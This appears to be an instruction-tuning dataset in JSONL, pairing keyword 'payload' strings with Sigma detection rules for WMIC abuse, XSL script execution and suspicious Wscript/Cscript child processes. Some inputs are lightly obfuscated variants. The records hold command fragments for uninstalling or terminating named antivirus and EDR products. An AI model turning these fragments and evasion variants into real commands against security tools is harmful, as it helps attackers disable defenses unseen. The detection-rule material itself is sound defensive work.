{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC wmic call uninstall", "output": "title: Application Removed Via Wmic.EXE\nid: b53317a0-8acf-4fd1-8de8-a5401e776b96\nrelated:\n    - id: 847d5ff3-8a31-4737-a970-aeae8fe21765 # Uninstall Security Products\n      type: derived\nstatus: test\ndescription: Detects the removal or uninstallation of an application via \"Wmic.EXE\".\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md#atomic-test-10---application-uninstall-using-wmic\nauthor: frack113\ndate: 2022-01-28\nmodified: 2024-07-02\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'call'\n            - 'uninstall'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WMIC.exe uninstall wmic.exe call", "output": "title: Application Removed Via Wmic.EXE\nid: b53317a0-8acf-4fd1-8de8-a5401e776b96\nrelated:\n    - id: 847d5ff3-8a31-4737-a970-aeae8fe21765 # Uninstall Security Products\n      type: derived\nstatus: test\ndescription: Detects the removal or uninstallation of an application via \"Wmic.EXE\".\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md#atomic-test-10---application-uninstall-using-wmic\nauthor: frack113\ndate: 2022-01-28\nmodified: 2024-07-02\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'call'\n            - 'uninstall'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic product where call uninstall /nointeractive wmic caption like call delete call terminate process where delete %carbon% %cylance% %endpoint% %eset% %malware% %Sophos% %symantec% Antivirus AVG Carbon Black CarbonBlack Cb Defense Sensor 64-bit Crowdstrike Sensor Cylance Dell Threat Defense DLP Endpoint Endpoint Detection Endpoint Protection Endpoint Security Endpoint Sensor ESET File Security LogRhythm System Monitor Service Malwarebytes McAfee Agent Microsoft Security Client Sophos Anti-Virus Sophos AutoUpdate Sophos Credential Store Sophos Management Console Sophos Management Database Sophos Management Server Sophos Remote Management System Sophos Update Manager Threat Protection VirusScan Webroot SecureAnywhere Windows Defender", "output": "title: Potential Tampering With Security Products Via WMIC\nid: 847d5ff3-8a31-4737-a970-aeae8fe21765\nrelated:\n    - id: b53317a0-8acf-4fd1-8de8-a5401e776b96 # Generic Uninstall\n      type: derived\nstatus: test\ndescription: Detects uninstallation or termination of security products using the WMIC utility\nreferences:\n    - https://twitter.com/cglyer/status/1355171195654709249\n    - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/\n    - https://www.mandiant.com/resources/unc2165-shifts-to-evade-sanctions\n    - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\n    - https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-01-30\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli_1:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'product where '\n            - 'call'\n            - 'uninstall'\n            - '/nointeractive'\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'caption like '\n        CommandLine|contains:\n            - 'call delete'\n            - 'call terminate'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'process '\n            - 'where '\n            - 'delete'\n    selection_product:\n        CommandLine|contains:\n            - '%carbon%'\n            - '%cylance%'\n            - '%endpoint%'\n            - '%eset%'\n            - '%malware%'\n            - '%Sophos%'\n            - '%symantec%'\n            - 'Antivirus'\n            - 'AVG '\n            - 'Carbon Black'\n            - 'CarbonBlack'\n            - 'Cb Defense Sensor 64-bit'\n            - 'Crowdstrike Sensor'\n            - 'Cylance '\n            - 'Dell Threat Defense'\n            - 'DLP Endpoint'\n            - 'Endpoint Detection'\n            - 'Endpoint Protection'\n            - 'Endpoint Security'\n            - 'Endpoint Sensor'\n            - 'ESET File Security'\n            - 'LogRhythm System Monitor Service'\n            - 'Malwarebytes'\n            - 'McAfee Agent'\n            - 'Microsoft Security Client'\n            - 'Sophos Anti-Virus'\n            - 'Sophos AutoUpdate'\n            - 'Sophos Credential Store'\n            - 'Sophos Management Console'\n            - 'Sophos Management Database'\n            - 'Sophos Management Server'\n            - 'Sophos Remote Management System'\n            - 'Sophos Update Manager'\n            - 'Threat Protection'\n            - 'VirusScan'\n            - 'Webroot SecureAnywhere'\n            - 'Windows Defender'\n    condition: 1 of selection_cli_* and selection_product\nfalsepositives:\n    - Legitimate administration\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic product where call uninstall /nointeractive wmic caption like call delete call terminate process where delete %carbon% %cylance% %endpoint% %eset% %malware% %Sophos% %symantec% Anti\"virus\" AVG Carbon Black CarbonBlack Cb Defense Sensor 64-bit Crowdstrike Sensor Cylance Dell Threat Defense DLP Endpoint Endpoint Detection Endpoint Protection Endpoint Security Endpoint Sensor ESET File Security LogRhythm System Monitor Service Malwarebytes McAfee Agent Microsoft Security Client Sophos Anti-Virus Sophos AutoUpdate Sophos Credential Store Sophos Management Console Sophos Management Database Sophos Management Server Sophos Remote Management System Sophos Update Manager Threat Protection VirusScan Webroot SecureAnywhere Windows Defender", "output": "title: Potential Tampering With Security Products Via WMIC\nid: 847d5ff3-8a31-4737-a970-aeae8fe21765\nrelated:\n    - id: b53317a0-8acf-4fd1-8de8-a5401e776b96 # Generic Uninstall\n      type: derived\nstatus: test\ndescription: Detects uninstallation or termination of security products using the WMIC utility\nreferences:\n    - https://twitter.com/cglyer/status/1355171195654709249\n    - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/\n    - https://www.mandiant.com/resources/unc2165-shifts-to-evade-sanctions\n    - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\n    - https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-01-30\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli_1:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'product where '\n            - 'call'\n            - 'uninstall'\n            - '/nointeractive'\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'caption like '\n        CommandLine|contains:\n            - 'call delete'\n            - 'call terminate'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'process '\n            - 'where '\n            - 'delete'\n    selection_product:\n        CommandLine|contains:\n            - '%carbon%'\n            - '%cylance%'\n            - '%endpoint%'\n            - '%eset%'\n            - '%malware%'\n            - '%Sophos%'\n            - '%symantec%'\n            - 'Antivirus'\n            - 'AVG '\n            - 'Carbon Black'\n            - 'CarbonBlack'\n            - 'Cb Defense Sensor 64-bit'\n            - 'Crowdstrike Sensor'\n            - 'Cylance '\n            - 'Dell Threat Defense'\n            - 'DLP Endpoint'\n            - 'Endpoint Detection'\n            - 'Endpoint Protection'\n            - 'Endpoint Security'\n            - 'Endpoint Sensor'\n            - 'ESET File Security'\n            - 'LogRhythm System Monitor Service'\n            - 'Malwarebytes'\n            - 'McAfee Agent'\n            - 'Microsoft Security Client'\n            - 'Sophos Anti-Virus'\n            - 'Sophos AutoUpdate'\n            - 'Sophos Credential Store'\n            - 'Sophos Management Console'\n            - 'Sophos Management Database'\n            - 'Sophos Management Server'\n            - 'Sophos Remote Management System'\n            - 'Sophos Update Manager'\n            - 'Threat Protection'\n            - 'VirusScan'\n            - 'Webroot SecureAnywhere'\n            - 'Windows Defender'\n    condition: 1 of selection_cli_* and selection_product\nfalsepositives:\n    - Legitimate administration\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic product where --call uninstall /nointeractive wmic caption like --call delete --call terminate process where delete %carbon% %cylance% %endpoint% %eset% %malware% %Sophos% %symantec% Antivirus AVG Carbon Black CarbonBlack Cb Defense Sensor 64-bit Crowdstrike Sensor Cylance Dell Threat Defense DLP Endpoint Endpoint Detection Endpoint Protection Endpoint Security Endpoint Sensor ESET File Security LogRhythm System Monitor Service Malwarebytes McAfee Agent Microsoft Security Client Sophos Anti-Virus Sophos AutoUpdate Sophos Credential Store Sophos Management Console Sophos Management Database Sophos Management Server Sophos Remote Management System Sophos Update Manager Threat Protection VirusScan Webroot SecureAnywhere Windows Defender", "output": "title: Potential Tampering With Security Products Via WMIC\nid: 847d5ff3-8a31-4737-a970-aeae8fe21765\nrelated:\n    - id: b53317a0-8acf-4fd1-8de8-a5401e776b96 # Generic Uninstall\n      type: derived\nstatus: test\ndescription: Detects uninstallation or termination of security products using the WMIC utility\nreferences:\n    - https://twitter.com/cglyer/status/1355171195654709249\n    - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/\n    - https://www.mandiant.com/resources/unc2165-shifts-to-evade-sanctions\n    - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\n    - https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-01-30\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli_1:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'product where '\n            - 'call'\n            - 'uninstall'\n            - '/nointeractive'\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'caption like '\n        CommandLine|contains:\n            - 'call delete'\n            - 'call terminate'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'process '\n            - 'where '\n            - 'delete'\n    selection_product:\n        CommandLine|contains:\n            - '%carbon%'\n            - '%cylance%'\n            - '%endpoint%'\n            - '%eset%'\n            - '%malware%'\n            - '%Sophos%'\n            - '%symantec%'\n            - 'Antivirus'\n            - 'AVG '\n            - 'Carbon Black'\n            - 'CarbonBlack'\n            - 'Cb Defense Sensor 64-bit'\n            - 'Crowdstrike Sensor'\n            - 'Cylance '\n            - 'Dell Threat Defense'\n            - 'DLP Endpoint'\n            - 'Endpoint Detection'\n            - 'Endpoint Protection'\n            - 'Endpoint Security'\n            - 'Endpoint Sensor'\n            - 'ESET File Security'\n            - 'LogRhythm System Monitor Service'\n            - 'Malwarebytes'\n            - 'McAfee Agent'\n            - 'Microsoft Security Client'\n            - 'Sophos Anti-Virus'\n            - 'Sophos AutoUpdate'\n            - 'Sophos Credential Store'\n            - 'Sophos Management Console'\n            - 'Sophos Management Database'\n            - 'Sophos Management Server'\n            - 'Sophos Remote Management System'\n            - 'Sophos Update Manager'\n            - 'Threat Protection'\n            - 'VirusScan'\n            - 'Webroot SecureAnywhere'\n            - 'Windows Defender'\n    condition: 1 of selection_cli_* and selection_product\nfalsepositives:\n    - Legitimate administration\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic product where call uninstall /nointeractive wmic caption like call delete call terminate process where delete %carbon% %cylance% %endpoint% %eset% %malware% %Sophos% %symantec% Antivirus AVG Carbon Black CarbonBlack Cb Defense Sensor 64-bit Crowdstrike Sensor Cylance Dell Threat Defense DLP Endpoint Endpoint Detection Endpoint Protection Endpoint Security Endpoint Sensor ESET File Security LogRhythm System Monitor Service Malwarebytes McAfee Agent Microsoft Security Client Sophos Anti-Virus Sophos AutoUpdate Sophos Credential Store Sophos Management Console Sophos Management Database Sophos Management Server Sophos Remote Management System Sophos Update Manager Threat Protection VirusScan Webroot SecureAnywhere Windows Defender", "output": "title: Potential Tampering With Security Products Via WMIC\nid: 847d5ff3-8a31-4737-a970-aeae8fe21765\nrelated:\n    - id: b53317a0-8acf-4fd1-8de8-a5401e776b96 # Generic Uninstall\n      type: derived\nstatus: test\ndescription: Detects uninstallation or termination of security products using the WMIC utility\nreferences:\n    - https://twitter.com/cglyer/status/1355171195654709249\n    - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/\n    - https://www.mandiant.com/resources/unc2165-shifts-to-evade-sanctions\n    - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\n    - https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-01-30\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli_1:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'product where '\n            - 'call'\n            - 'uninstall'\n            - '/nointeractive'\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'caption like '\n        CommandLine|contains:\n            - 'call delete'\n            - 'call terminate'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'process '\n            - 'where '\n            - 'delete'\n    selection_product:\n        CommandLine|contains:\n            - '%carbon%'\n            - '%cylance%'\n            - '%endpoint%'\n            - '%eset%'\n            - '%malware%'\n            - '%Sophos%'\n            - '%symantec%'\n            - 'Antivirus'\n            - 'AVG '\n            - 'Carbon Black'\n            - 'CarbonBlack'\n            - 'Cb Defense Sensor 64-bit'\n            - 'Crowdstrike Sensor'\n            - 'Cylance '\n            - 'Dell Threat Defense'\n            - 'DLP Endpoint'\n            - 'Endpoint Detection'\n            - 'Endpoint Protection'\n            - 'Endpoint Security'\n            - 'Endpoint Sensor'\n            - 'ESET File Security'\n            - 'LogRhythm System Monitor Service'\n            - 'Malwarebytes'\n            - 'McAfee Agent'\n            - 'Microsoft Security Client'\n            - 'Sophos Anti-Virus'\n            - 'Sophos AutoUpdate'\n            - 'Sophos Credential Store'\n            - 'Sophos Management Console'\n            - 'Sophos Management Database'\n            - 'Sophos Management Server'\n            - 'Sophos Remote Management System'\n            - 'Sophos Update Manager'\n            - 'Threat Protection'\n            - 'VirusScan'\n            - 'Webroot SecureAnywhere'\n            - 'Windows Defender'\n    condition: 1 of selection_cli_* and selection_product\nfalsepositives:\n    - Legitimate administration\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe -format Format:List Format:htable Format:hform Format:table Format:mof Format:value Format:rawxml Format:xml Format:csv", "output": "title: XSL Script Execution Via WMIC.EXE\nid: 05c36dd6-79d6-4a9a-97da-3db20298ab2d\nstatus: test\ndescription: |\n    Detects the execution of WMIC with the \"format\" flag to potentially load XSL files.\n    Adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\n    Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\nauthor: Timur Zinniatullin, oscd.community, Swachchhanda Shrawan Poudel\ndate: 2019-10-21\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains|windash: '-format'     # wmic process list -FORMAT /? or wmic process list /FORMAT /?\n    filter_main_known_format:\n        CommandLine|contains:\n            - 'Format:List'\n            - 'Format:htable'\n            - 'Format:hform'\n            - 'Format:table'\n            - 'Format:mof'\n            - 'Format:value'\n            - 'Format:rawxml'\n            - 'Format:xml'\n            - 'Format:csv'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - WMIC.exe FP depend on scripts and administrative methods used in the monitored environment.\n    - Static format arguments - https://petri.com/command-line-wmi-part-3\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe -format Format:List Format:htable Format:hform Format:table \"F\"\"o\"\"r\"\"m\"\"a\"\"t\"\":\"\"m\"\"o\"\"f\" Format:value Format:rawxml Format:xml Format:csv", "output": "title: XSL Script Execution Via WMIC.EXE\nid: 05c36dd6-79d6-4a9a-97da-3db20298ab2d\nstatus: test\ndescription: |\n    Detects the execution of WMIC with the \"format\" flag to potentially load XSL files.\n    Adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\n    Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\nauthor: Timur Zinniatullin, oscd.community, Swachchhanda Shrawan Poudel\ndate: 2019-10-21\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains|windash: '-format'     # wmic process list -FORMAT /? or wmic process list /FORMAT /?\n    filter_main_known_format:\n        CommandLine|contains:\n            - 'Format:List'\n            - 'Format:htable'\n            - 'Format:hform'\n            - 'Format:table'\n            - 'Format:mof'\n            - 'Format:value'\n            - 'Format:rawxml'\n            - 'Format:xml'\n            - 'Format:csv'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - WMIC.exe FP depend on scripts and administrative methods used in the monitored environment.\n    - Static format arguments - https://petri.com/command-line-wmi-part-3\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic -format Format:List Format:htable Format:hform Format:table Format:mof Format:value Format:rawxml Format:xml Format:csv", "output": "title: XSL Script Execution Via WMIC.EXE\nid: 05c36dd6-79d6-4a9a-97da-3db20298ab2d\nstatus: test\ndescription: |\n    Detects the execution of WMIC with the \"format\" flag to potentially load XSL files.\n    Adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\n    Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\nauthor: Timur Zinniatullin, oscd.community, Swachchhanda Shrawan Poudel\ndate: 2019-10-21\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains|windash: '-format'     # wmic process list -FORMAT /? or wmic process list /FORMAT /?\n    filter_main_known_format:\n        CommandLine|contains:\n            - 'Format:List'\n            - 'Format:htable'\n            - 'Format:hform'\n            - 'Format:table'\n            - 'Format:mof'\n            - 'Format:value'\n            - 'Format:rawxml'\n            - 'Format:xml'\n            - 'Format:csv'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - WMIC.exe FP depend on scripts and administrative methods used in the monitored environment.\n    - Static format arguments - https://petri.com/command-line-wmi-part-3\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe -format Format:List Format:htable Format:hform Format:table Format:mof Format:value Format:rawxml Format:xml Format:csv", "output": "title: XSL Script Execution Via WMIC.EXE\nid: 05c36dd6-79d6-4a9a-97da-3db20298ab2d\nstatus: test\ndescription: |\n    Detects the execution of WMIC with the \"format\" flag to potentially load XSL files.\n    Adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\n    Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\nauthor: Timur Zinniatullin, oscd.community, Swachchhanda Shrawan Poudel\ndate: 2019-10-21\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains|windash: '-format'     # wmic process list -FORMAT /? or wmic process list /FORMAT /?\n    filter_main_known_format:\n        CommandLine|contains:\n            - 'Format:List'\n            - 'Format:htable'\n            - 'Format:hform'\n            - 'Format:table'\n            - 'Format:mof'\n            - 'Format:value'\n            - 'Format:rawxml'\n            - 'Format:xml'\n            - 'Format:csv'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - WMIC.exe FP depend on scripts and administrative methods used in the monitored environment.\n    - Static format arguments - https://petri.com/command-line-wmi-part-3\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WmiPrvSe.exe \\WmiPrvSE.exe \\WerFault.exe", "output": "title: WmiPrvSE Spawned A Process\nid: d21374ff-f574-44a7-9998-4a8c8bf33d7d\nrelated:\n    - id: 8a582fe2-0882-4b89-a82a-da6b2dc32937\n      type: similar\n    - id: 692f0bec-83ba-4d04-af7e-e884a96059b6\n      type: similar\nstatus: stable\ndescription: Detects WmiPrvSE spawning a process\nreferences:\n    - https://threathunterplaybook.com/hunts/windows/190815-RemoteServiceInstallation/notebook.html\nauthor: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019-08-15\nmodified: 2023-03-23\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\WmiPrvSe.exe'\n    filter_logonid:\n        LogonId:\n            - '0x3e7'  # LUID 999 for SYSTEM\n            - 'null'   # too many false positives\n    filter_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    filter_wmiprvse:\n        Image|endswith: '\\WmiPrvSE.exe'\n    filter_werfault:\n        Image|endswith: '\\WerFault.exe'\n    filter_null:  # some backends need the null value in a separate expression\n        LogonId: null\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - False positives are expected (e.g. in environments where WinRM is used legitimately)\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WmiPrvSe.exe \"\\WmiPrvSE.exe\" \\WerFault.exe", "output": "title: WmiPrvSE Spawned A Process\nid: d21374ff-f574-44a7-9998-4a8c8bf33d7d\nrelated:\n    - id: 8a582fe2-0882-4b89-a82a-da6b2dc32937\n      type: similar\n    - id: 692f0bec-83ba-4d04-af7e-e884a96059b6\n      type: similar\nstatus: stable\ndescription: Detects WmiPrvSE spawning a process\nreferences:\n    - https://threathunterplaybook.com/hunts/windows/190815-RemoteServiceInstallation/notebook.html\nauthor: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019-08-15\nmodified: 2023-03-23\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\WmiPrvSe.exe'\n    filter_logonid:\n        LogonId:\n            - '0x3e7'  # LUID 999 for SYSTEM\n            - 'null'   # too many false positives\n    filter_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    filter_wmiprvse:\n        Image|endswith: '\\WmiPrvSE.exe'\n    filter_werfault:\n        Image|endswith: '\\WerFault.exe'\n    filter_null:  # some backends need the null value in a separate expression\n        LogonId: null\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - False positives are expected (e.g. in environments where WinRM is used legitimately)\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WmiPrvSe \\WmiPrvSE \\WerFault", "output": "title: WmiPrvSE Spawned A Process\nid: d21374ff-f574-44a7-9998-4a8c8bf33d7d\nrelated:\n    - id: 8a582fe2-0882-4b89-a82a-da6b2dc32937\n      type: similar\n    - id: 692f0bec-83ba-4d04-af7e-e884a96059b6\n      type: similar\nstatus: stable\ndescription: Detects WmiPrvSE spawning a process\nreferences:\n    - https://threathunterplaybook.com/hunts/windows/190815-RemoteServiceInstallation/notebook.html\nauthor: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019-08-15\nmodified: 2023-03-23\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\WmiPrvSe.exe'\n    filter_logonid:\n        LogonId:\n            - '0x3e7'  # LUID 999 for SYSTEM\n            - 'null'   # too many false positives\n    filter_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    filter_wmiprvse:\n        Image|endswith: '\\WmiPrvSE.exe'\n    filter_werfault:\n        Image|endswith: '\\WerFault.exe'\n    filter_null:  # some backends need the null value in a separate expression\n        LogonId: null\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - False positives are expected (e.g. in environments where WinRM is used legitimately)\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WmiPrvSe.exe \\WmiPrvSE.exe \\WerFault.exe", "output": "title: WmiPrvSE Spawned A Process\nid: d21374ff-f574-44a7-9998-4a8c8bf33d7d\nrelated:\n    - id: 8a582fe2-0882-4b89-a82a-da6b2dc32937\n      type: similar\n    - id: 692f0bec-83ba-4d04-af7e-e884a96059b6\n      type: similar\nstatus: stable\ndescription: Detects WmiPrvSE spawning a process\nreferences:\n    - https://threathunterplaybook.com/hunts/windows/190815-RemoteServiceInstallation/notebook.html\nauthor: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019-08-15\nmodified: 2023-03-23\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\WmiPrvSe.exe'\n    filter_logonid:\n        LogonId:\n            - '0x3e7'  # LUID 999 for SYSTEM\n            - 'null'   # too many false positives\n    filter_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    filter_wmiprvse:\n        Image|endswith: '\\WmiPrvSE.exe'\n    filter_werfault:\n        Image|endswith: '\\WerFault.exe'\n    filter_null:  # some backends need the null value in a separate expression\n        LogonId: null\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - False positives are expected (e.g. in environments where WinRM is used legitimately)\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript.exe \\cscript.exe \\cmd.exe \\powershell.exe \\pwsh.exe mshta http rundll32 regsvr32 msiexec \\rundll32.exe \\rundll32.exe UpdatePerUserSystemParameters PrintUIEntry ClearMyTracksByProcess", "output": "title: Cscript/Wscript Potentially Suspicious Child Process\nid: b6676963-0353-4f88-90f5-36c20d443c6a\nstatus: test\ndescription: |\n    Detects potentially suspicious child processes of Wscript/Cscript. These include processes such as rundll32 with uncommon exports or PowerShell spawning rundll32 or regsvr32.\n    Malware such as Pikabot and Qakbot were seen using similar techniques as well as many others.\nreferences:\n    - Internal Research\n    - https://github.com/pr0xylife/Pikabot/blob/fc58126127adf0f65e78f4eec59675523f48f086/Pikabot_30.10.2023.txt\n    - https://github.com/pr0xylife/Pikabot/blob/fc58126127adf0f65e78f4eec59675523f48f086/Pikabot_22.12.2023.txt\nauthor: Nasreddine Bencherchali (Nextron Systems), Alejandro Houspanossian ('@lekz86')\ndate: 2023-05-15\nmodified: 2024-01-02\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n    selection_cli_script_main:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    # Note: Add other combinations that are suspicious\n    selection_cli_script_option_mshta:\n        CommandLine|contains|all:\n            - 'mshta'\n            - 'http'\n    selection_cli_script_option_other:\n        CommandLine|contains:\n            - 'rundll32'\n            - 'regsvr32'\n            - 'msiexec'\n    selection_cli_standalone:\n        Image|endswith: '\\rundll32.exe'\n    filter_main_rundll32_known_exports:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains:\n            - 'UpdatePerUserSystemParameters'\n            - 'PrintUIEntry'\n            - 'ClearMyTracksByProcess'\n    condition: selection_parent and ( selection_cli_standalone or (selection_cli_script_main and 1 of selection_cli_script_option_*) ) and not 1 of filter_main_*\nfalsepositives:\n    - Some false positives might occur with admin or third party software scripts. Investigate and apply additional filters accordingly.\nlevel: medium"}
